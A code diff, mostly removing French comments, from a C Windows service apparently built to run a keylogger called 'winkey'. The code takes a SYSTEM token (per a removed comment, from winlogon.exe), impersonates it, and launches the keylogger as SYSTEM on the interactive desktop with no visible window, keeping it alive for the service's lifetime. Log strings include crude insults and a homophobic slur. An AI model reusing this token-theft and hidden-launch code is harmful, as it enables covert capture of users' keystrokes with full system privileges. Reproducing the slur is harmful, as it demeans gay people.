@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <wchar.h>
 #include "cli.h"
-#include "token.h"  // <-- déclare GetSystemImpersonationToken()
+#include "token.h" 
 
 #define SERVICE_NAME L"tinky"
 
@@ -19,7 +19,7 @@ static HANDLE gChildProc = NULL;
 
 static void AppendLog(const wchar_t* fmt, ...)
 {
-    CreateDirectoryW(L"C:\\Temp", NULL); // au cas où
+    CreateDirectoryW(L"C:\\Temp", NULL);
     HANDLE h = CreateFileW(L"C:\\Temp\\svc_trace.log",
                            FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -30,7 +30,6 @@ static void AppendLog(const wchar_t* fmt, ...)
     _vsnwprintf_s(line, _countof(line), _TRUNCATE, fmt, ap);
     va_end(ap);
 
-    // ajout d’un \r\n
     wchar_t out[1100];
     _snwprintf_s(out, _countof(out), _TRUNCATE, L"%s\r\n", line);
 
@@ -55,8 +54,7 @@ static void LogLastErr(const wchar_t* where) {
                    NULL, e, 0, buf, (DWORD)(sizeof buf / sizeof *buf), NULL);
     fwprintf(stderr, L"[svc] %s failed (%lu): %s\n", where, e, buf);
 }
-// Lance un EXE console sans fenêtre visible, redirige stdout/stderr vers un .log
-// Retourne TRUE si OK et, si outProc!=NULL, renvoie le handle process (à fermer plus tard)
+
 static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HANDLE* outProc)
 {
     AppendLog(L"--- RunHiddenConsole start ---");
@@ -65,28 +63,24 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
 
     if (!exePath || !*exePath) { AppendLog(L"[ERR] exePath empty"); return FALSE; }
 
-    // 1) Vérif du fichier exe
     DWORD attr = GetFileAttributesW(exePath);
     if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
         AppendLog(L"[ERR] exe introuvable ou est un répertoire");
         return FALSE;
     }
 
-    // 2) Construire cmdline correctement quotée : "C:\...\main.exe" [args]
     wchar_t cmd[1024];
     if (args && *args) _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\" %s", exePath, args);
     else               _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\"",   exePath);
     AppendLog(L"cmdline='%s'", cmd);
 
-    // 3) Répertoire de travail = dossier de l’exe
     wchar_t workdir[MAX_PATH];
     wcsncpy_s(workdir, _countof(workdir), exePath, _TRUNCATE);
     wchar_t* last = wcsrchr(workdir, L'\\');
     if (last) *last = L'\0';
     AppendLog(L"workdir='%s'", workdir);
 
-    // 4) Préparer handles STD*
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }; // héritables
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }; 
     CreateDirectoryW(L"C:\\Temp", NULL);
     LPCWSTR logFile = (logPath && *logPath) ? logPath : L"C:\\Temp\\child_output.log";
     HANDLE hLog = CreateFileW(logFile, GENERIC_WRITE, FILE_SHARE_READ,
@@ -107,21 +101,19 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
 
     PROCESS_INFORMATION pi = {0};
 
-    // 5) CreateProcess
-    DWORD flags = CREATE_NO_WINDOW; // console non visible, mais STD* valides
+    DWORD flags = CREATE_NO_WINDOW;
     AppendLog(L"CreateProcessW...");
     BOOL ok = CreateProcessW(
-        exePath,   // lpApplicationName (chemin complet)
-        cmd,       // lpCommandLine
+        exePath,
+        cmd,
         NULL, NULL,
-        TRUE,      // bInheritHandles -> indispensable pour STD*
+        TRUE,
         flags,
         NULL,
         workdir,
         &si, &pi
     );
 
-    // Les handles parents peuvent être fermés après CreateProcess
     CloseHandle(hNullIn);
     CloseHandle(hLog);
 
@@ -131,7 +123,6 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
         return FALSE;
     }
 
-    // 6) Diagnostic immédiat
     DWORD code = 0;
     if (GetExitCodeProcess(pi.hProcess, &code)) {
         if (code == STILL_ACTIVE) {
@@ -186,7 +177,6 @@ static VOID WINAPI CtrlHandler(DWORD ctrl)
     }
 }
 
-// Lance winkey avec le token système mais dans le desktop interactif
 static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
 {
     AppendLog(L"--- RunWinkeyAsSystem start ---");
@@ -196,17 +186,14 @@ static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
         return FALSE;
     }
 
-    // Construire la ligne de commande
     wchar_t cmd[1024];
     _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, 
                  L"\"%s\"", L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey\\main.exe");
     AppendLog(L"cmdline='%s'", cmd);
 
-    // Répertoire de travail
     wchar_t workdir[] = L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey";
     AppendLog(L"workdir='%s'", workdir);
 
-    // Préparer les handles de redirection
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     CreateDirectoryW(L"C:\\Temp", NULL);
     HANDLE hLog = CreateFileW(L"C:\\Temp\\winkey.log", GENERIC_WRITE, FILE_SHARE_READ,
@@ -230,25 +217,22 @@ static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
     si.hStdInput  = hNullIn;
     si.hStdOutput = hLog;
     si.hStdError  = hLog;
-    // CRITIQUE : spécifier le desktop interactif pour que les hooks fonctionnent
     si.lpDesktop = L"winsta0\\default";
 
     PROCESS_INFORMATION pi = {0};
     
-    // Créer le processus avec le token système mais sur le desktop interactif
     BOOL ok = CreateProcessAsUserW(
-        hSystemToken,  // Token système (winlogon.exe)
-        NULL,          // Application name (dans cmdline)
-        cmd,           // Ligne de commande
-        NULL, NULL,    // Security attributes
-        TRUE,          // Inherit handles
-        CREATE_NO_WINDOW, // Pas de fenêtre console visible
-        NULL,          // Environment
-        workdir,       // Working directory
+        hSystemToken,  
+        NULL,
+        cmd,
+        NULL, NULL,
+        TRUE,
+        CREATE_NO_WINDOW,
+        NULL,
+        workdir,
         &si, &pi
     );
 
-    // Fermer les handles de redirection
     CloseHandle(hNullIn);
     CloseHandle(hLog);
 
@@ -258,7 +242,6 @@ static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
         return FALSE;
     }
 
-    // Diagnostic
     DWORD code = 0;
     if (GetExitCodeProcess(pi.hProcess, &code)) {
         if (code == STILL_ACTIVE) {
@@ -284,14 +267,11 @@ static DWORD WINAPI Worker(LPVOID lpParam)
         didImpersonate = ImpersonateLoggedOnUser(hTok);
         AppendLog(L"Impersonation avec token système: %s", didImpersonate ? L"OK" : L"ECHEC");
     }
-    
-    // Lancer winkey avec le token système mais sur le desktop interactif
+
     RunWinkeyAsSystem(hTok, &gChildProc);
 
     AppendLog(L"nique les pd qui parle en scred\n\n");
     while (WaitForSingleObject(gStopEvent, 2000) == WAIT_TIMEOUT) {
-        // ... ton travail périodique ...
-        // (optionnel) surveiller le child :
         if (gChildProc) {
             AppendLog(L"si le savoir est une arme et ben ntm\n\n");
             DWORD code = 0;
@@ -302,7 +282,6 @@ static DWORD WINAPI Worker(LPVOID lpParam)
         }
     }
 
-    // À l'arrêt du service : terminaison "hard" si nécessaire
     if (gChildProc) {
         TerminateProcess(gChildProc, 0);
         WaitForSingleObject(gChildProc, 3000);
@@ -311,7 +290,7 @@ static DWORD WINAPI Worker(LPVOID lpParam)
     }
 
     if (didImpersonate) RevertToSelf();
-    if (hTok) CloseHandle(hTok); // le thread possède maintenant le handle
+    if (hTok) CloseHandle(hTok);
 
     return 0;
 }
@@ -374,11 +353,9 @@ int wmain(int argc, wchar_t** argv)
         { NULL, NULL }
     };
     if (!StartServiceCtrlDispatcherW(table)) {
-        // Si lancé *hors* SCM sans argument, on peut afficher une aide
         PrintLastError(L"StartServiceCtrlDispatcherW");
         fwprintf(stderr, L"Tip: run with one of: install | start | stop | delete | status\n");
         return 1;
     }
     return 0;
 }
-//cl /w4 /EHSC /DUNICODE /D_unicode main.c cli.c /llink advapi32.lib /FE:svc.exe
